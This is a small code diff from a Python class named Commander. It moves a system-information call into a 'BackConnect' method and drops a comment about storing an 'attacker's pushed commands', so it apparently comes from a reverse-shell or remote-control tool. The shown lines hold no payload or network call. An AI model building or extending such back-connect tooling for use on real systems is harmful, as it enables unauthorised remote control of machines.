@@ -32,13 +32,12 @@ class Commander(object):
 
         self.history = []  # Command history
 
-        info.get_information()
-        self.cwd = info.cwd
 
     def BackConnect(self):
+        info.get_information()
+        self.cwd = info.cwd
         complete.tab()      # calling auto-complete method
         cmdcount = 1
-        # Empty list to save attacker's pushed commands
         while True:
             try:
                 try:
